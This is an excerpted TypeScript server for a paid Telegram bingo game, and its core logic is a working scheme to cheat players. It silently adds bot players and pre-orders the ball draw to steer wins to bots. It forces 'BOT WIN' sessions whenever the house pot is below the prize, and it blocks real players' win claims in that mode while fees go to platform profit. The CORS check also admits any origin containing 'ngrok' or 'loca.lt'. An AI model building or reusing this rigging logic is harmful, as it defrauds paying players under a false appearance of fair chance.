...
app.use(cors({
  origin: (origin, callback) => {
    ...
    if (origin.includes('loca.lt') || origin.includes('ngrok')) return callback(null, true);
...
app.get('/api/settings/public', async (req: Request, res: Response) => {
  try {
    ...
    const obj = settings.reduce((acc: any, curr) => {
...
interface BotOverrides {
  ...
  forceWin?: 'BOT WIN' | 'REAL WIN';
  botNames?: string[];
}

interface RoomConfig {
  botMultiplier: number;  // default 4, range 2-8; actual bots = random(joinedReal, joinedReal × multiplier)
  housePot: number;
  steeringRatio: number;
  ...
  lastSessionData?: { type: string; collected: number; cut: number; addedToPot: number; prizePaid: number; potAfter: number };
  history?: Array<{ gameId: number, type: string, cut?: number, prizePaid?: number, potAfter: number }>;
}
...
async function saveRoomConfigToDB(roomId: string) {
    ...
    for (const setting of settings) {
      ...
      if (roomConfigs[roomId]) {
        try {
          ...
          roomConfigs[roomId] = { ...roomConfigs[roomId], ...parsed };
        } catch (e) {}
      }
    }
...
function getBingoLines(card: ReturnType<typeof generateBingoCard>): number[][] {
  const lines: number[][] = [];
  const matrix = [
  ...
  // 5 horizontal rows
  for (let r = 0; r < 5; r++) lines.push(matrix[r]);
  // 5 vertical columns
  for (let c = 0; c < 5; c++) lines.push([matrix[0][c], matrix[1][c], matrix[2][c], matrix[3][c], matrix[4][c]]);
  // 2 diagonals
...
function precalculateDrawOrder(roomId: string, state: GlobalRoomState, conf: RoomConfig, steeringRatio: number): {
  drawOrder: number[],
  botWinAtBall?: number,
  botWinCard?: number,
  botWinName?: string
  ...
  const realCards = new Map<number, ReturnType<typeof generateBingoCard>>();
  const botCards: ReturnType<typeof generateBingoCard>[] = [];
  const botCardIds: number[] = [];
  ...
  for (let i = 0; i < 75; i++) {
    let realOneAwayNeeds = new Set<number>();
    let currentClosest = 5;
    for (const card of realCards.values()) {
      const lines = getBingoLines(card);
      for (const line of lines) {
        let missing = [];
        for (const num of line) if (num !== 0 && !called.has(num)) missing.push(num);
        if (missing.length === 1) realOneAwayNeeds.add(missing[0]);
        if (missing.length < currentClosest) currentClosest = missing.length;
      }
    }
    if (i === 0) closestRealPlayerAway = currentClosest; // Initial state
    ...
    if (botWinAtBall === -1) {
      for (let b = 0; b < botCards.length; b++) {
        ...
        if (botWinAtBall !== -1) break;
      }
    }
    
    let avoidNumbers = new Set<number>();
    if (state.sessionMode === 'BOT WIN') {
      // Enhanced BOT WIN enforcement: Scan all real player patterns
      for (const [cardId, ownerId] of state.boughtCards.entries()) {
        if (state.botTelegramIds.has(ownerId)) continue; // Skip bot cards
    ...
    if (candidates.length === 0) candidates = Array.from(uncalled);
    
    let nextNum = -1;
    let useBotPool = Math.random() * 100 < steeringRatio;
    if (useBotPool && botCards.length > 0) {
      let botNums = new Set<number>();
      for (const card of botCards) {
        card.B.forEach(n => botNums.add(n)); card.I.forEach(n => botNums.add(n));
        card.N.forEach(n => botNums.add(n)); card.G.forEach(n => botNums.add(n)); card.O.forEach(n => botNums.add(n));
      }
      let botCandidates = candidates.filter(n => botNums.has(n));
      if (botCandidates.length > 0) nextNum = botCandidates[Math.floor(Math.random() * botCandidates.length)];
    }
    if (nextNum === -1) nextNum = candidates[Math.floor(Math.random() * candidates.length)];
  ...
  return { drawOrder, botWinAtBall, botWinCard, botWinName } as {
    drawOrder: number[],
    botWinAtBall?: number,
    botWinCard?: number,
    botWinName?: string
...
// --- Global Room State Engine (Lobby + Game) ---
...
interface GlobalRoomState {
  status: 'lobby' | 'game';
  boughtCards: Map<number, string>;
  reservedCards: Map<number, { telegramId: string; lockedAt: number }>;
  fee: number;
  ...
  // Bot Trickle State
  botTelegramIds: Set<string>;      // Which boughtCard owners are bots
  botTrickleActive?: boolean;       // Prevents duplicate loops
  scheduledBotCount?: number;       // Bots scheduled but not yet joined
  recentBotJoins?: number[];        // Timestamps for rate-limit window
  lastBotJoinAt?: number;           // Timestamp of last bot join

  // Game State
  botCount?: number;
  sessionMode?: 'BOT WIN' | 'REAL WIN' | 'MIXED';
  botWinAtBall?: number;
  botWinData?: WinnerData | null;
  activeSteeringRatio?: number;
  botWinCard?: number;
  botWinName?: string;
}

const roomStates: Record<string, GlobalRoomState> = {};
...
function createFreshRound(fee = 0, cycleNumber = 0): GlobalRoomState {
  return {
    status: 'lobby',
    boughtCards: new Map(),
...
function addOneBotToRoom(roomId: string, state: GlobalRoomState): boolean {
  if (roomStates[roomId] !== state || state.status !== 'lobby') return false;
  const conf = roomConfigs[roomId] || roomConfigs['room-5'];
  ...
  let cardId = 10000;
  while (state.boughtCards.has(cardId)) cardId++;
  ...
  if (!state.recentBotJoins) state.recentBotJoins = [];
...
function scheduleOneBotJoin(roomId: string, state: GlobalRoomState) {
  ...
  setTimeout(() => {
    ...
    if (roomStates[roomId] !== state || state.status !== 'lobby') return;
    const now = Date.now();
...
function startBotTrickleLoop(roomId: string, state: GlobalRoomState) {
  if (state.botTrickleActive) return;
  ...
  const tick = () => {
    ...
    if (remaining <= 2) return; // Stop 2s before end — game transition handles the rest
    ...
    if (joinedReal === 0) { setTimeout(tick, 1000); return; }
...
function getRoomState(roomId: string): GlobalRoomState {
...
function checkAndProgressRoomState(roomId: string): GlobalRoomState {
  ...
  if (state.status === 'lobby') {
    ...
    if (elapsed >= LOBBY_DURATION) {
      ...
      if (botsToAdd > 0) console.log(`🤖 Added ${botsToAdd} bots silently at game start for ${roomId}`);
      ...
      let mode: 'BOT WIN' | 'REAL WIN' | 'MIXED' = 'REAL WIN';
      if (conf.overrides.forceWin) {
        mode = conf.overrides.forceWin;
      } else {
        if (conf.housePot < state.finalPrizePool) mode = 'BOT WIN';
        else mode = 'REAL WIN';
      }
    ...
    if (state.botWinAtBall !== undefined && state.botWinAtBall >= 0 && currentBallIndex >= state.botWinAtBall && !state.winnerData) {
      ...
      if (roomConfigs[roomId]) {
        ...
        roomConfigs[roomId].platformProfit += platformCut;
        roomConfigs[roomId].housePot += toPot;
        roomConfigs[roomId].collected += realFees;
        roomConfigs[roomId].lastSessionData = { type: 'BOT WIN', collected: realFees, cut: platformCut, addedToPot: toPot, prizePaid: 0, potAfter: roomConfigs[roomId].housePot };
        roomConfigs[roomId].history = roomConfigs[roomId].history || [];
        roomConfigs[roomId].history.unshift({ gameId: roomConfigs[roomId].sessionsPlayed, type: 'BOT WIN', cut: platformCut, potAfter: roomConfigs[roomId].housePot });
        if (roomConfigs[roomId].history.length > 10) roomConfigs[roomId].history.pop();
        saveRoomConfigToDB(roomId);
      }
      console.log(`🤖 BOT WON automatically in Room ${roomId}! Collected: ${realFees}. To Pot: ${Math.floor(realFees * 0.8)}.`);
      
      setTimeout(() => {
        if (roomStates[roomId] === state) roomStates[roomId] = createFreshRound(state.fee, state.cycleNumber + 1);
      }, 8000);
    }
...
app.post('/api/rooms/:roomId/join', (req: Request, res: Response) => {
  ...
  if (state.fee === 0 && fee) state.fee = fee;
...
app.get('/api/rooms/:roomId/state', (req: Request, res: Response) => {
  ...
  if (state.status === 'lobby') {
    ...
    for (const [cardId, resData] of state.reservedCards.entries()) {
      if (now - resData.lockedAt > RESERVATION_TTL) state.reservedCards.delete(cardId);
    }
    ...
    const myReserved: number[] = [];
    const myBought: number[] = [];
    
    for (const [cardId, ownerId] of state.boughtCards.entries()) {
      if (ownerId === telegramId) myBought.push(cardId);
    }
    for (const [cardId, resData] of state.reservedCards.entries()) {
      if (resData.telegramId === telegramId) myReserved.push(cardId);
    }
...
// INSTANT LOCK
app.post('/api/rooms/:roomId/select', (req: Request, res: Response) => {
  const { telegramId, cardId } = req.body;
  const state = checkAndProgressRoomState(req.params.roomId);
  
  if (state.status !== 'lobby') return res.status(400).json({ error: 'Game in progress.' });
  ...
  for (const res of state.reservedCards.values()) {
    if (res.telegramId === String(telegramId)) myLockCount++;
  }
  if (myLockCount >= 2) return res.status(400).json({ error: 'Max 2 cards.' });
...
// INSTANT UNLOCK
app.post('/api/rooms/:roomId/deselect', (req: Request, res: Response) => {
  const { telegramId, cardId } = req.body;
  const state = getRoomState(req.params.roomId);

  if (state.status !== 'lobby') return res.json({ success: true });
...
// BUY CARDS
app.post('/api/rooms/:roomId/buy', async (req: Request, res: Response) => {
  try {
    ...
    for (const cardId of cards) {
      if (state.boughtCards.has(cardId)) return res.status(400).json({ error: `Card ${cardId} already bought!` });
      const resData = state.reservedCards.get(cardId);
      if (!resData || resData.telegramId !== String(telegramId)) return res.status(400).json({ error: `Card ${cardId} not reserved by you!` });
    }
...
// GAME CLAIM WIN
app.post('/api/game/claim-win', async (req: Request, res: Response) => {
  try {
    const { telegramId, username, roomId, cardId, winType, cells, prize } = req.body;
    const state = getRoomState(roomId);

    if (state.status !== 'game') return res.status(400).json({ error: 'No active game.' });
    if (state.winnerData) return res.status(400).json({ error: 'Game already won.' });
    ...
    if (state.sessionMode === 'BOT WIN' || (conf && conf.housePot < prize)) {
      ...
      if (conf) {
        ...
        if (conf.history.length > 10) conf.history.pop();
        saveRoomConfigToDB(roomId);
      }
    ...
    if (conf) {
      conf.housePot -= prize;
      if (conf.housePot < 0) conf.housePot = 0; // Prevent negative pot
      conf.paidOut += prize;
...
app.get('/api/wallet/:telegramId/status', async (req: Request, res: Response) => {
  try {
...
function calculateClosestRealPlayerNeeds(state: GlobalRoomState, currentBallIndex: number): number {
  if (state.boughtCards.size === 0) return 5;
  const called = new Set(state.drawOrder.slice(0, currentBallIndex));

  // Get only real player cards (exclude bots)
  const realPlayerCards: ReturnType<typeof generateBingoCard>[] = [];
  for (const [cardId, ownerId] of state.boughtCards.entries()) {
    if (!state.botTelegramIds.has(ownerId)) {
  ...
  if (realPlayerCards.length === 0) return 5;
...
app.get('/api/admin/bots', (req, res) => {
  const roomsData = Object.keys(roomConfigs).map(roomId => {
    const conf = roomConfigs[roomId];
...
app.post('/api/admin/bots/global', (req, res) => {
  ...
  if (enabled !== undefined) globalBotsEnabled = enabled;
  if (steeringRatio !== undefined) globalSteeringRatio = steeringRatio;
  if (stopGames) {
...
app.post('/api/admin/bots/room/:roomId/override', (req, res) => {
  const conf = roomConfigs[req.params.roomId];
  if (!conf) return res.status(404).json({ error: 'Room not found' });
